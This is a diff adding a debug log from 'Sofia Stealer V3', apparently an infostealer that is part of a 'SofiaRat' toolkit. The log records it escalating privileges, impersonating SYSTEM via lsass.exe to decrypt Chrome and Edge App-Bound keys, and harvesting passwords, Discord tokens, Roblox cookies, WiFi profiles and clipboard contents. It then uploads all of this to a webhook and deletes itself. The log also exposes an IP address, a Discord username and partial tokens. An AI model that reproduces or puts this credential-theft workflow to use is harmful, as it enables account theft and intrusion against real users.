@@ -1,0 +1,136 @@
+=== Sofia Debug Log ===
+--- Sofia Stealer V3 ---
+[*] Instance Process ID: 6604
+[+] Dynamic APIs initialized.
+[+] Running with Administrator privileges.
+[+] Mutex set, single instance confirmed.
+[+] Anti-analysis gauntlet passed.
+[*] Collecting system information...
+[*] Fingerprinting system...
+  [+] Hostname: ADMIN-PC, Username: pc
+  [+] OS: W 2 (Build 1)
+  [+] Local IP: 192.168.1.30
+[*] Fetching public IP...
+  [+] Public IP: 171.252.188.148
+[+] System info collected.
+[*] Harvesting browser data...
+[*] Harvesting Chrome...
+  [*] Found v20 App-Bound key (size: 860)
+    [*] Starting v20 Master Key derivation...
+    [*] Attempting to enable SeDebugPrivilege...
+    [+] SeDebugPrivilege enabled.
+    [*] lsass.exe PID: 672
+    [+] Successfully impersonated SYSTEM via lsass.exe
+    [+] Layer 1 decrypted. Size: 384
+    [+] Layer 2 decrypted. Size: 132
+    [*] Layer 2 Hex (first 16): 1F 00 00 00 02 43 3A 5C 50 72 6F 67 72 61 6D 20 
+    [+] Found Flag 3 at offset 39
+    [*] Key blob parsed. Flag: 3
+    [*] Attempting to enable SeDebugPrivilege...
+    [+] SeDebugPrivilege enabled.
+    [*] lsass.exe PID: 672
+    [+] Successfully impersonated SYSTEM via lsass.exe
+    [+] NCrypt decrypted AES key successfully.
+    [+] Final Master Key recovered!
+  [+] Decrypted v20 App-Bound Master Key. Size: 32
+  [+] Master key retrieved. App-Bound key: Yes
+  [+] Collected 10 passwords.
+[*] Harvesting Edge...
+  [*] Found v20 App-Bound key (size: 1552)
+    [*] Starting v20 Master Key derivation...
+    [*] Attempting to enable SeDebugPrivilege...
+    [+] SeDebugPrivilege enabled.
+    [*] lsass.exe PID: 672
+    [+] Successfully impersonated SYSTEM via lsass.exe
+    [+] Layer 1 decrypted. Size: 322
+    [+] Layer 2 decrypted. Size: 72
+    [*] Layer 2 Hex (first 16): 20 00 00 00 02 43 3A 5C 50 72 6F 67 72 61 6D 20 
+    [-] Failed to find valid v20 flag at expected offsets.
+    [*] Key blob parsed. Flag: 0
+    [-] Unknown v20 flag: 0
+    [-] Final decryption of Master Key failed.
+  [-] Failed to derive v20 master key from blob.
+  [+] Master key retrieved. App-Bound key: No
+  [+] Collected 46 passwords.
+[*] Checking Discord at C:\Users\pc\AppData\Roaming\discord...
+  [+] Found 5 potential tokens. Validating...
+    [+] Valid token found for user: _anhkhoa1411_#0
+    [-] Invalid token: MTM5MjgyNjIxODg...
+    [-] Invalid token: 9vyjbMK85bo92Rv...
+[*] Checking Discord PTB at C:\Users\pc\AppData\Roaming\discordptb...
+  [-] No tokens found in Discord PTB.
+[*] Checking Discord Canary at C:\Users\pc\AppData\Roaming\discordcanary...
+  [-] No tokens found in Discord Canary.
+[*] Filtering Chromium data for Roblox cookies...
+[*] Harvesting Chrome...
+  [*] Found v20 App-Bound key (size: 860)
+    [*] Starting v20 Master Key derivation...
+    [*] Attempting to enable SeDebugPrivilege...
+    [+] SeDebugPrivilege enabled.
+    [*] lsass.exe PID: 672
+    [+] Successfully impersonated SYSTEM via lsass.exe
+    [+] Layer 1 decrypted. Size: 384
+    [+] Layer 2 decrypted. Size: 132
+    [*] Layer 2 Hex (first 16): 1F 00 00 00 02 43 3A 5C 50 72 6F 67 72 61 6D 20 
+    [+] Found Flag 3 at offset 39
+    [*] Key blob parsed. Flag: 3
+    [*] Attempting to enable SeDebugPrivilege...
+    [+] SeDebugPrivilege enabled.
+    [*] lsass.exe PID: 672
+    [+] Successfully impersonated SYSTEM via lsass.exe
+    [+] NCrypt decrypted AES key successfully.
+    [+] Final Master Key recovered!
+  [+] Decrypted v20 App-Bound Master Key. Size: 32
+  [+] Master key retrieved. App-Bound key: Yes
+  [+] Collected 10 passwords.
+[*] Harvesting Edge...
+  [*] Found v20 App-Bound key (size: 1552)
+    [*] Starting v20 Master Key derivation...
+    [*] Attempting to enable SeDebugPrivilege...
+    [+] SeDebugPrivilege enabled.
+    [*] lsass.exe PID: 672
+    [+] Successfully impersonated SYSTEM via lsass.exe
+    [+] Layer 1 decrypted. Size: 322
+    [+] Layer 2 decrypted. Size: 72
+    [*] Layer 2 Hex (first 16): 20 00 00 00 02 43 3A 5C 50 72 6F 67 72 61 6D 20 
+    [-] Failed to find valid v20 flag at expected offsets.
+    [*] Key blob parsed. Flag: 0
+    [-] Unknown v20 flag: 0
+    [-] Final decryption of Master Key failed.
+  [-] Failed to derive v20 master key from blob.
+  [+] Master key retrieved. App-Bound key: No
+  [+] Collected 46 passwords.
+[*] Searching for saved WiFi profiles...
+[+] Recovered 11 WiFi profiles.
+[*] Reading clipboard...
+  [+] Clipboard captured. Type: Text
+[*] Starting File Grabber search...
+  [+] Found interesting file: C:\Users\pc\Desktop\SofiaRat\Plugins\Cmstp-Bypass\Cmstp-Bypass\obj\Debug\Cmstp-Bypass.vbproj.FileListAbsolute.txt
+  [+] Found interesting file: C:\Users\pc\Desktop\SofiaRat\Plugins\Cmstp-Bypass\Cmstp-Bypass\obj\Release\Cmstp-Bypass.vbproj.FileListAbsolute.txt
+  [+] Found interesting file: C:\Users\pc\Desktop\SofiaRat\Plugins\Keylogger\Keylogger\obj\Debug\Keylogger.vbproj.FileListAbsolute.txt
+  [+] Found interesting file: C:\Users\pc\Desktop\SofiaRat\Plugins\Keylogger\Keylogger\obj\Release\Keylogger.vbproj.FileListAbsolute.txt
+  [+] Found interesting file: C:\Users\pc\Desktop\SofiaRat\Plugins\UACBypass\UACBypass\obj\Debug\UACBypass.vbproj.FileListAbsolute.txt
+  [+] Found interesting file: C:\Users\pc\Desktop\SofiaRat\Plugins\UACBypass\UACBypass\obj\Release\UACBypass.vbproj.FileListAbsolute.txt
+[+] File Grabber search complete.
+[*] Sending summary embed...
+  [+] Webhook POST successful (Code: 204)
+[*] Uploading file: SystemInfo.txt (639 bytes)
+  [+] Webhook POST successful (Code: 200)
+[*] Uploading file: Passwords.txt (5972 bytes)
+  [+] Webhook POST successful (Code: 200)
+[*] Uploading file: Cookies.txt (18 bytes)
+  [+] Webhook POST successful (Code: 200)
+[*] Uploading file: CreditCards.txt (23 bytes)
+  [+] Webhook POST successful (Code: 200)
+[*] Uploading file: History.txt (18 bytes)
+  [+] Webhook POST successful (Code: 200)
+[*] Uploading file: DiscordTokens.txt (692 bytes)
+  [+] Webhook POST successful (Code: 200)
+[*] Uploading file: RobloxCookies.txt (25 bytes)
+  [+] Webhook POST successful (Code: 200)
+[*] Uploading file: WiFiPasswords.txt (751 bytes)
+  [+] Webhook POST successful (Code: 200)
+[*] Uploading file: Clipboard.txt (510 bytes)
+  [+] Webhook POST successful (Code: 200)
+[+] Exfiltration complete.
+[*] Shutting down and scheduling self-delete...
